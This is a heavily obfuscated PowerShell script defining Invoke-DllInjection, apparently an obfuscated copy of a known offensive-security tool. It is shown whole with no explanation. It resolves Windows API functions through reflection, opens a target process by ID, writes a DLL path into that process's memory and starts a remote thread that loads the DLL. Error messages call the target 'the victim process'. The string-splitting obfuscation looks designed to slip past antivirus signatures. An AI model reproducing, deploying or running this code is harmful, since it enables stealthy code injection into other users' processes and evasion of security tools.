  SeT-IteM ('vaRIABLE:'+'j'+'E'+'3T9X')  (  [tYPE]("{2}{9}{8}{6}{4}{5}{11}{10}{7}{3}{0}{1}" -F'DERacCes','S','s','iL','rEFlecTI','on.eMiT.AS','.','lyBu','teM','Ys','MB','sE')) ; Set-iTem  VaRIABle:NUjGT8 ( [TyPE]("{1}{7}{4}{3}{0}{5}{6}{2}"-f'TIon.','sY','Ns','C','EM.rEFlE','Ca','LliNgConVEnTio','st') ) ;    seT-iTem ('VariaBLE'+':6'+'F7') ( [TYPe]("{1}{2}{0}"-f'maiN','AP','pdo')  );    $5lm0r=[TypE]("{2}{4}{0}{1}{3}" -F'io.fIl','emOD','SYsT','E','Em.');   SEt-VARIABle  ("wKUO"+"Hr") ( [tYpe]("{1}{2}{4}{0}{3}"-f 'Ce','SYST','eM.io.fi','SS','LEaC')  ); sV  LCn (  [TYpE]("{2}{7}{5}{4}{1}{6}{0}{3}" -f'o','Ci','S','DiNG','.As','eM.TExT','IeNC','YST'))  ;   seT-VariabLe  t1bW3R ([Type]("{4}{3}{2}{0}{1}"-F'rIGi','N','Ko','ee','SySTem.Io.s')  )  ; $FGq8  =  [tyPe]("{1}{0}"-F'32','uInT');$Y4k3 =[typE]("{1}{0}"-F 'OL','bO')  ;    $ydT10o =  [typE]("{1}{6}{0}{3}{8}{2}{9}{4}{5}{7}" -F'St','S','NtEROPsERVic','em.R','.ma','rsHa','y','L','UnTIME.i','Es') ;   $GLcBz4  =  [TYPe]("{1}{0}"-F'PtR','Int');function InV`OkE-d`llINje`ction
{


    Param (
        [Parameter( pOsITION = 0, MAndaTorY = ${T`RUe} )]
        [Int]
        ${pR`OCe`ssID},

        [Parameter( PosiTioN = 1, MAnDaTorY = ${tr`Ue} )]
        [String]
        ${d`lL}
    )

    
    try
    {
        &("{3}{2}{1}{0}" -f 's','es','et-Proc','G') -Id ${PrO`cEss`iD} -ErrorAction ("{1}{0}" -f 'top','S') | &("{1}{2}{0}"-f 'll','O','ut-Nu')
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw ("{2}{0}{1}{3}{4}"-f'c','ess does ','Pro','not exis','t!')
    }
    
    
    try
    {
        ${d`ll} = (&("{1}{2}{0}" -f 'h','Reso','lve-Pat') ${d`LL} -ErrorAction ("{0}{1}"-f 'St','op'))."P`Ath"
        &("{3}{2}{0}{1}" -f 'Verbos','e','ite-','Wr') ('Full'+' '+'path'+' '+'to'+' '+'D'+'ll: '+"$Dll")
        ${ASCi`ien`c`OD`eR} = &("{1}{2}{3}{0}" -f 't','New','-Obje','c') ("{4}{1}{2}{3}{0}"-f 'ncoding','stem.','Text.AS','CIIE','Sy')
        
        ${dLlBy`Te`Ar`RAy} = ${asC`i`IenC`oDeR}.("{1}{0}"-f 'tBytes','Ge').Invoke(${d`LL})
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw ("{0}{3}{2}{1}" -f 'In','th!','pa','valid Dll ')
    }

    function Local:gEt-deLEg`At`E`Ty`pE
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( poSitiOn = 0)]
            [Type[]]
            ${paRam`e`TErS} = (&("{2}{1}{0}"-f 't','c','New-Obje') ("{0}{1}" -f 'Type[',']')(0)),
            
            [Parameter( POsITION = 1 )]
            [Type]
            ${r`et`U`RNtypE} = [Void]
        )

        ${dom`AiN} =  ( dIR ('VARi'+'a'+'b'+'lE:6f7')).ValuE::"cURReNT`do`MAIn"
        ${d`Ynas`semBly} = &("{1}{2}{0}"-f'ject','N','ew-Ob') ("{3}{0}{1}{4}{5}{2}" -f'ystem.','Reflec','lyName','S','tion.As','semb')(("{2}{4}{3}{1}{0}" -f 'e','legat','Re','e','flectedD'))
        ${aS`s`eMblyB`UiL`dER} = ${DO`m`AIN}."def`InEdyN`AMI`C`AsS`em`Bly"(${DY`NA`S`SEmBlY},   ( ls ('VaRIaBle:'+'j'+'e'+'3T9X') ).VALUe::"R`Un")
        ${MODulE`Bu`IL`d`er} = ${aS`SeMb`LyB`U`IlDEr}.("{5}{3}{0}{1}{4}{2}"-f'na','micMo','ule','neDy','d','Defi').Invoke(("{1}{4}{2}{3}{0}" -f 'e','I','oryModu','l','nMem'), ${Fa`LsE})
        ${TY`P`ebu`IldEr} = ${MoDu`le`Bu`ILder}.("{0}{2}{1}{3}" -f 'D','f','e','ineType').Invoke(("{2}{0}{1}{3}{4}"-f'e','legateT','MyD','y','pe'), ("{6}{9}{11}{2}{8}{4}{3}{0}{5}{10}{7}{1}" -f'iC','s',', Seale','s','An','lass','Class, ','s','d, ','Publi',', AutoCla','c'), [System.MulticastDelegate])
        ${cONst`Ru`CtoRBuI`LdEr} = ${tYpEbuIL`d`eR}.("{1}{2}{3}{0}"-f'r','Define','Constr','ucto').Invoke(("{3}{2}{1}{6}{4}{5}{0}"-f'ic',', H','me','RTSpecialNa','B','ySig, Publ','ide'),   (  vArIAble  NujGT8  -VaLu  )::"st`ANDArD", ${P`A`Rame`TERs})
        ${CoNsTr`UC`T`oRBui`lDer}.("{4}{0}{3}{5}{2}{6}{1}" -f'etImpl','ags','on','ementat','S','i','Fl').Invoke(("{5}{3}{1}{0}{2}{4}"-f'me, ','i','Manag','t','ed','Run'))
        ${me`ThodB`UiL`der} = ${typ`eBU`iL`DeR}.("{1}{2}{0}{3}"-f 'tho','Defin','eMe','d').Invoke('Invoke', ("{3}{1}{6}{4}{7}{0}{2}{5}"-f 'ot, Virt','ublic, Hi','ua','P','ig, NewS','l','deByS','l'), ${R`e`TUr`NtYpe}, ${PA`RAmEte`Rs})
        ${MEtHOd`BU`I`l`Der}.("{1}{0}{4}{3}{2}{5}" -f'nt','SetImpleme','onF','i','at','lags').Invoke(("{4}{2}{3}{0}{1}" -f'n','aged','u','ntime, Ma','R'))
        
        &("{1}{2}{0}{3}"-f 'ite-O','W','r','utput') ${TYP`EbU`ildEr}.("{2}{1}{0}" -f 'pe','eateTy','Cr').Invoke()
    }

    function L`OCaL:`G`ET-pR`OCaddrEsS
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( position = 0, mAndAtOry = ${tr`Ue} )]
            [String]
            ${MOd`U`lE},
            
            [Parameter( POSItioN = 1, MAnDatoRY = ${t`Rue} )]
            [String]
            ${p`Roc`EDuRE}
        )

        
        ${s`YSTe`M`AS`SeMblY} =   $6F7::"c`U`RrENt`Do`MAin".("{0}{2}{3}{1}{4}"-f'GetA','e','ssem','bli','s').Invoke() |
            &("{2}{0}{3}{1}" -f 'ere','ect','Wh','-Obj') { ${_}."gLO`B`Ala`ssEmbLYCac`hE" -And ${_}."Lo`cATI`on".("{0}{1}"-f'Spli','t').Invoke('\\')[-1].("{0}{1}{2}" -f 'Eq','ual','s').Invoke(("{0}{3}{2}{1}"-f'Sys','l','dl','tem.')) }
        ${uNsaf`enAT`IvemE`THODs} = ${sYstEMaSSe`mb`LY}.("{1}{0}{2}"-f'y','GetT','pe').Invoke(("{5}{8}{4}{3}{2}{1}{7}{0}{6}" -f'nsafeNativeMetho','in32.','W','.','soft','Mic','ds','U','ro'))
        
        ${g`EtmOdulE`Han`DLe} = ${unSaFenA`Ti`VEM`Eth`ods}.("{2}{1}{0}{3}"-f'etho','tM','Ge','d').Invoke(("{2}{1}{0}{3}{4}" -f 'eHan','dul','GetMo','d','le'))
        ${G`e`Tp`R`OcADDrEss} = ${UNSafEna`Ti`VEmETh`o`dS}.("{0}{1}{2}" -f'G','etM','ethod').Invoke(("{3}{2}{0}{1}"-f 'dd','ress','cA','GetPro'))
        
        ${keR`N`32h`AndLE} = ${G`eTMO`DULeHAn`D`lE}."iN`Vo`kE"(${nU`ll}, @(${mO`DU`le}))
        ${tM`p`Ptr} = &("{0}{1}{2}{3}"-f 'N','ew-Ob','j','ect') ("{1}{0}"-f'tr','IntP')
        ${han`DLEr`EF} = &("{1}{2}{0}" -f'ect','New-O','bj') ("{7}{9}{10}{4}{6}{8}{1}{5}{11}{0}{3}{2}" -f 'es.Ha','me.Inte','f','ndleRe','u','ro','nt','S','i','ys','tem.R','pServic')(${TMPP`TR}, ${k`E`Rn32`HANdlE})
        
        
        &("{2}{3}{0}{1}"-f't','put','Wr','ite-Ou') ${G`etprocAd`dRE`Ss}."inV`oke"(${n`ULL}, @([System.Runtime.InteropServices.HandleRef]${H`AN`D`leref}, ${prOced`U`Re}))
    }

    function l`ocal:GET-pEAr`CH`IT`eC`Tu`Re
    {
        Param
        (
            [Parameter( pOSITiOn = 0,
                        mandaTorY = ${T`RuE} )]
            [String]
            ${pA`TH}
        )
    
        
        ${f`iLeST`ReaM} = &("{0}{1}{2}" -f'N','ew-Ob','ject') ("{2}{1}{4}{0}{3}{5}"-f 't','.IO.F','System','re','ileS','am')(${pA`TH},  (gET-ItEM  VariabLE:5lM0r).ValuE::"Op`eN",  (  gEt-vAriABlE ("WKuo"+"HR")  -ValuEO)::"r`EAd")
    
        [Byte[]] ${Mz`H`Ea`der} = &("{1}{2}{0}"-f't','New-','Objec') ("{0}{1}"-f'Byt','e[]')(2)
        ${f`I`LEstr`eaM}.("{1}{0}" -f'd','Rea').Invoke(${MZ`h`ea`Der},0,2) | &("{2}{1}{0}" -f't-Null','u','O')
    
        ${HeAD`er} =   (  vAriABlE LCn -VALu )::"a`sCii"."G`eTST`RINg"(${m`ZH`e`AdER})
        if (${h`EaDer} -ne 'MZ')
        {
            ${FILeS`T`ReaM}.("{0}{1}"-f 'Clos','e').Invoke()
            Throw ("{2}{0}{1}{3}" -f'id PE',' h','Inval','eader.')
        }
    
        
        ${F`IL`eSTREaM}."Se`ek"(0x3c,  $T1bw3r::"B`EgIn") | &("{2}{0}{1}" -f 'ut-N','ull','O')
    
        [Byte[]] ${l`Fa`New} = &("{1}{0}{2}" -f 'c','New-Obje','t') ("{1}{0}" -f 'e[]','Byt')(4)
    
        
        ${f`ILeSt`ReaM}.("{1}{0}" -f'ead','R').Invoke(${L`FanEw},0,4) | &("{2}{1}{0}"-f 'ull','-N','Out')
        ${p`E`oFfseT} = [Int] ('0x{0}' -f (( ${lf`A`New}[-1..-4] | &('%') { ${_}.("{0}{2}{1}"-f 'ToS','ing','tr').Invoke('X2') } ) -join ''))
    
        
        ${fILe`St`R`eam}."se`Ek"(${pEof`FS`eT} + 4,   ( gEt-VARIABle  t1bw3R -VAlu  )::"bEg`in") | &("{0}{1}"-f 'O','ut-Null')
        [Byte[]] ${iM`Age`_f`iLE_`MAChiNe} = &("{1}{0}{2}" -f 'w-Obje','Ne','ct') ("{0}{1}" -f'Byte[',']')(2)
    
        
        ${fIlE`sT`ReAM}.("{1}{0}" -f'ead','R').Invoke(${IMagE`_`FilE_MAC`HInE},0,2) | &("{0}{1}{2}"-f 'Ou','t-Nul','l')
        ${arCHI`T`e`C`TuRe} = '{0}' -f (( ${i`MAge_Fil`e_M`AcHINe}[-1..-2] | &('%') { ${_}.("{0}{2}{1}"-f 'To','ng','Stri').Invoke('X2') } ) -join '')
        ${F`ilEStR`eam}.("{1}{0}"-f 'se','Clo').Invoke()
    
        if ((${A`R`C`HiTECturE} -ne ("{1}{0}" -f '4C','01')) -and (${A`RChiTEc`Tu`Re} -ne ("{1}{0}" -f '664','8')))
        {
            Throw ("{0}{2}{7}{6}{8}{9}{5}{3}{4}{1}" -f 'Inv','ture.','al',' arc','hitec','supported','eade','id PE h','r o','r un')
        }
    
        if (${AR`ChIT`eCtuRe} -eq ("{1}{0}"-f '14C','0'))
        {
            &("{2}{0}{1}{3}"-f 'ite-Ou','t','Wr','put') 'X86'
        }
        elseif (${aR`chi`TectUre} -eq ("{1}{0}" -f '664','8'))
        {
            &("{2}{1}{0}{3}" -f 'u','Outp','Write-','t') 'X64'
        }
        else
        {
            &("{0}{1}{3}{2}"-f 'W','r','t','ite-Outpu') ("{1}{0}"-f 'R','OTHE')
        }
    }

    
    
    ${o`P`enproCeS`SAddr} = &("{3}{1}{2}{4}{0}" -f 'ress','et-','Pr','G','ocAdd') ("{1}{0}{2}"-f'2.dl','kernel3','l') ("{0}{1}{3}{2}"-f 'Ope','nP','cess','ro')
    ${Op`en`pro`c`essdELeGaTe} = &("{1}{0}{3}{2}{4}"-f 'legat','Get-De','p','eTy','e') @([UInt32], [Bool], [UInt32]) ([IntPtr])
    ${OPE`N`ProCE`SS} =  $YDt10O::("{0}{7}{8}{1}{3}{4}{2}{6}{5}"-f 'GetDele','unct','oi','ion','P','r','nte','gateF','orF').Invoke(${opEnPROCe`S`s`Ad`Dr}, ${op`ENproC`eSs`deLegA`TE})
    ${vIR`TuALAlLO`cEX`A`DdR} = &("{0}{2}{1}"-f'Get-ProcAd','ess','dr') ("{3}{0}{1}{2}" -f 'e','rnel32.dl','l','k') ("{2}{3}{0}{1}"-f 't','ualAllocEx','V','ir')
    ${vi`RtuA`LaL`LOc`exde`leg`ATe} = &("{3}{2}{4}{0}{1}"-f'ate','Type','-Dele','Get','g') @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
    ${vI`RT`UALAllO`c`eX} =  (  lS ("vAri"+"AbLe:yDT"+"10"+"o") ).valUE::("{4}{6}{3}{2}{5}{1}{0}" -f 'tionPointer','c','rF','egateFo','G','un','etDel').Invoke(${v`irtu`AlALl`OcEXA`d`dR}, ${VI`RTuaLaL`loC`ex`DelEG`AtE})
    ${VIrTu`A`Lfr`EEE`xA`Ddr} = &("{1}{2}{3}{0}" -f'ss','Ge','t-Pr','ocAddre') ("{0}{2}{1}" -f'ke','l','rnel32.dl') ("{3}{1}{2}{0}" -f 'eEx','tu','alFre','Vir')
    ${vIrT`UalFre`EEXD`ELeGA`TE} = &("{3}{2}{4}{0}{1}" -f 'e','Type','De','Get-','legat') @([IntPtr], [IntPtr], [Uint32], [UInt32]) ([Bool])
    ${V`I`RTUAlFR`eeEx} =  $YdT10O::("{1}{0}{6}{3}{2}{7}{5}{8}{4}"-f't','Ge','eForFunct','elegat','r','Po','D','ion','inte').Invoke(${VIr`TU`AL`FRe`eExadDR}, ${V`I`RTUal`Fre`eexde`l`EGaTe})
    ${W`RiTE`ProceSS`mEMoR`yaDdr} = &("{2}{0}{3}{1}" -f 'et-Pr','ss','G','ocAddre') ("{0}{1}{2}{3}"-f 'ke','rnel','32','.dll') ("{0}{2}{1}{3}"-f'Writ','Process','e','Memory')
    ${WRitEproC`essmeMO`R`ydeLE`GAte} = &("{3}{2}{0}{1}"-f 'gat','eType','-Dele','Get') @([IntPtr], [IntPtr], [Byte[]], [UInt32],  (  gCi  ("VA"+"riaBLe:fG"+"q8") ).valUE.("{0}{1}{2}" -f 'Ma','keByRefT','ype').Invoke()) ([Bool])
    ${wr`iTEProCeS`smE`MO`Ry} =   ( VariAblE Ydt10O -VALUEo )::("{5}{7}{2}{4}{6}{3}{0}{1}" -f 'ctio','nPointer','Delega','n','teFor','G','Fu','et').Invoke(${wRI`TEpRoCE`SSmeMo`RY`AD`dr}, ${WR`iteprOce`SS`m`E`Mor`YD`eL`eGaTE})
    ${RTLCreAtE`Use`R`ThR`eAdAdDr} = &("{3}{4}{1}{0}{2}"-f 'd','rocAd','ress','Get-','P') ("{1}{2}{0}" -f'dll','nt','dll.') ("{3}{1}{0}{4}{2}"-f'eUs','lCreat','d','Rt','erThrea')
    ${r`T`LcREATEUSer`T`H`Re`AddeLegATe} = &("{2}{1}{0}{3}"-f 't','lega','Get-De','eType') @([IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    ${RTL`CrEaTeUs`E`Rt`h`R`Ead} =  (gET-vARiabLe  YDT10O  -vaLueO  )::("{2}{7}{1}{5}{3}{8}{6}{0}{4}" -f 'oin','gat','GetDel','Fo','ter','e','P','e','rFunction').Invoke(${rtL`CreAteuS`ERt`hReaDaD`DR}, ${r`TlC`RE`A`TE`USeRThRe`AdDE`Leg`ATe})
    ${cLOs`E`HAn`DleA`D`dr} = &("{1}{3}{0}{2}" -f 'ocAddres','Get-','s','Pr') ("{2}{1}{0}" -f '2.dll','3','kernel') ("{1}{3}{0}{2}"-f 'd','Cl','le','oseHan')
    ${Cl`OSEHaN`dled`EL`EgA`TE} = &("{3}{2}{1}{0}{4}" -f'teT','ga','-Dele','Get','ype') @([IntPtr]) ([Bool])
    ${CLosEha`Nd`lE} =  $ydt10O::("{0}{8}{4}{1}{2}{3}{5}{7}{6}"-f 'GetDeleg','Fu','nctio','n','teFor','Point','r','e','a').Invoke(${cL`OsE`hAndleAd`Dr}, ${CLoSe`HAn`dlEDELE`Ga`TE})

    
    if ( (  GEt-VariabLe ("g"+"lCBz4") ).valUe::"sI`zE" -eq 4)
    {
        ${P`o`W`ershElL3`2bIt} = ${Tr`UE}
    }
    else
    {
        ${P`OWERs`h`elL32Bit} = ${f`A`lse}
    }

    ${oSarC`hi`TEctU`Re} = (&("{2}{1}{0}{3}{4}" -f 'e','WmiObj','Get-','c','t') ("{4}{1}{3}{2}{5}{0}{6}"-f 'te','in32','er','_Op','W','atingSys','m'))."O`sARch`i`TEcT`URE"

    switch (${oS`ARc`h`IT`eCTURe})
    {
        ("{1}{0}"-f'bit','32-') { ${6`4`BItOs} = ${fAL`SE} }
        ("{1}{0}" -f 't','64-bi') { ${64B`ITOS} = ${t`RUe} }
    }

    
    ${iS`woW64P`ROc`EssAd`Dr} = &("{3}{1}{2}{0}{4}"-f'ProcA','t','-','Ge','ddress') ("{1}{2}{0}" -f'l','kernel32.','dl') ("{3}{1}{2}{0}"-f'ss','ow64Pro','ce','IsW')

    if (${is`wOW`64PrO`C`EssADDR})
    {
        ${I`SwOW64PROcEs`SdEL`EGAtE} = &("{0}{3}{4}{2}{1}" -f'Ge','Type','e','t','-Delegat') @([IntPtr],   ( GET-CHIlDITeM varIAbLe:y4K3).ValUE.("{0}{1}{2}"-f'Make','ByRefTyp','e').Invoke()) ([Bool])
        ${iS`Wo`W64pr`OCe`SS} =   $YDt10O::("{3}{2}{5}{4}{0}{1}" -f'uncti','onPointer','tDel','Ge','ateForF','eg').Invoke(${isW`oW64PRoc`ESSA`dDR}, ${iSWoW64P`R`OcEsSD`EL`EGate})
    }

    ${ARCHItE`CTU`RE} = &("{0}{1}{3}{2}" -f'G','et-PEA','cture','rchite') ${D`LL}

    &("{2}{0}{3}{1}" -f'rite','bose','W','-Ver') ('Arch'+'it'+'ectur'+'e '+'o'+'f '+'the'+' '+'d'+'ll '+'t'+'o '+'b'+'e '+'i'+'njected:'+' '+"$Architecture")

    
    ${H`proC`E`Ss} = ${opEN`PrO`cess}."I`NvOkE"(0x001F0FFF, ${fA`LsE}, ${Pr`ocEs`SiD}) 

    if (!${hprO`cEsS})
    {
        Throw ("{2}{0}{1}{3}{4}{5}{7}{8}{6}" -f 'le ','to o','Unab','p','en pr','oc','.','ess handl','e')
    }

    if (${64`B`ITOS}) 
    {
        if ( (${a`RChi`T`EcT`URe} -ne 'X86') -and (${arc`H`I`TECtuRE} -ne 'X64') )
        {
            Throw ("{6}{5}{9}{10}{1}{2}{4}{8}{0}{3}{7}"-f 'r','hit','ec','t','hture','86 ','Only x','ed.','s suppo','or AMD64 ar','c')
        }

        
        ${Is`Wow`64} = ${F`ALSE}
        ${Isw`OW6`4PROcE`ss}."iN`VOke"(${hPROC`Ess}, [Ref] ${IswO`w`64}) | &("{0}{1}{2}"-f 'Out-','N','ull')

        if ( ${Po`werS`hELl3`2B`IT} -and (${ARcH`iTeC`T`Ure} -eq 'X64') )
        {
            Throw ("{13}{10}{0}{2}{11}{15}{4}{14}{1}{9}{12}{5}{3}{16}{8}{6}{7}" -f 'not m','ithin 32','a','en','co','p','bit ve','rsion and try again.','-','-','can','nipulate 64-','bit PowerShell. O','You ','de w','bit ',' the 64')
        }

        if ( (!${I`sWo`w64}) -and (${ARcHi`T`E`cTUre} -eq 'X86') )
        {
            Throw ("{4}{7}{2}{1}{9}{5}{10}{3}{6}{8}{0}" -f 'rocess.','ot','u cann','b','Y','DLL into','it ','o','p',' inject a 32-bit ',' a 64-')
        }

        if ( ${iS`wo`W64} -and (${A`RCHITecT`U`RE} -eq 'X64') )
        {
            Throw ("{10}{2}{9}{3}{6}{0}{8}{1}{5}{4}{7}"-f '-bit D','a 32',' can','t inject ','roc','-bit p','a 64','ess.','LL into ','no','You')
        }
    }
    else
    {
        if (${AR`chi`Tec`TuRe} -ne 'X86')
        {
            Throw ("{1}{5}{2}{6}{0}{9}{7}{3}{4}{8}"-f 't co','PE fi','e was','o','r x','l',' no','piled f','86.','m')
        }
    }

    
    ${lo`AdL`ibr`ARYadDR} = &("{4}{2}{0}{3}{1}" -f 'Pr','ess','et-','ocAddr','G') ("{0}{2}{1}" -f 'kernel3','dll','2.') ("{0}{2}{1}"-f 'Lo','yA','adLibrar')
    &("{2}{1}{0}{3}"-f'rbos','ite-Ve','Wr','e') "LoadLibrary address: 0x$($LoadLibraryAddr.ToString("X$([IntPtr]::Size*2)")) "

    
    ${R`emOtEMEm`ADdR} = ${v`i`RT`U`AlALLOCeX}."i`NVO`KE"(${HpR`oceSs},  ( gCi ("VARIAble"+":Gl"+"cbz"+"4") ).VAlUE::"z`Ero", ${D`lL}."lEN`gTH", 0x3000, 4) 
    if (${ReMo`TeMe`MAD`Dr} -eq  $gLCbZ4::"ze`Ro")
    {
        Throw ("{12}{13}{4}{14}{15}{7}{1}{11}{8}{2}{3}{0}{10}{6}{5}{9}" -f 'ry runni','y in r','ote proc','ess. T',' t',' elev','Shell','allocate memor','m','ated.','ng Power','e','Un','able','o',' ')
    }
    &("{0}{2}{3}{1}"-f'W','te-Verbose','r','i') "DLL path memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)")) "

    
    ${wRITeP`RoCeS`SM`e`m`ORy}."iN`VoKE"(${hpRoC`ESS}, ${ReM`OTEMe`Ma`DDr}, ${dllbYTEa`RR`Ay}, ${d`LL}."Leng`TH", [Ref] 0) | &("{1}{2}{0}"-f'Null','Ou','t-')
    &("{1}{0}{2}"-f 'ite-Verb','Wr','ose') ("{2}{4}{3}{5}{1}{0}" -f'sfully.','uces','Dll p','tte','ath wri','n s')

    
    ${R`EsuLT} = ${rt`lc`R`EAtE`USErThreAd}."I`Nvo`kE"(${H`pr`o`CEss},   ( VARIablE  ('GlC'+'b'+'z4')  -VALUEONLY)::"z`ERO", ${F`Alse}, 0,  (Get-vaRIable ("G"+"lcBz"+"4")).ValuE::"z`eRO",  (  GeT-VariablE ('gLCB'+'z4')  -vALuEonL  )::"ZE`RO", ${L`oADLiBR`ArYAd`dR}, ${ReMoTeM`EM`Addr},   $gLCBZ4::"z`eRo",  ( vARIAble gLcbZ4 ).VAlue::"z`Ero")
    if (${R`E`sult})
    {
        Throw "Unable to launch remote thread. NTSTATUS: 0x$($Result.ToString('X8')) "
    }
    
    ${v`i`Rtua`l`FreEex}."InVO`ke"(${hpro`C`ESs}, ${Rem`OtEmEMA`D`dr}, ${D`LL}."Le`Ng`TH", 0x8000) | &("{2}{1}{0}" -f '-Null','t','Ou') 

    
    ${c`LO`SeHANDle}."i`NvO`ke"(${HPro`CE`sS}) | &("{2}{0}{1}"-f'-Nu','ll','Out')

    
    ${FI`lENAME} = &("{0}{1}{2}"-f'S','plit-Pa','th') ${D`ll} -Leaf
    ${DlL`In`Fo} = (&("{1}{3}{0}{2}"-f 'Proc','G','ess','et-') -Id ${prOcE`S`siD})."M`ODUleS" | &('?') { ${_}."file`NaME".("{1}{0}" -f 'ns','Contai').Invoke(${fIL`e`NAME}) }

    if (!${DL`lInFo})
    {
        Throw ("{0}{5}{7}{8}{4}{6}{3}{1}{10}{9}{2}"-f'Dl','properly i','s.',' inject ',' do','l ','t','di','d','the victim proces','nto ')
    }

    &("{2}{0}{1}"-f 'b','ose','Write-Ver') ("{2}{1}{4}{3}{0}{5}"-f'mp',' i','Dll','ion co','nject','lete!')

    ${DLL`iNFo}
}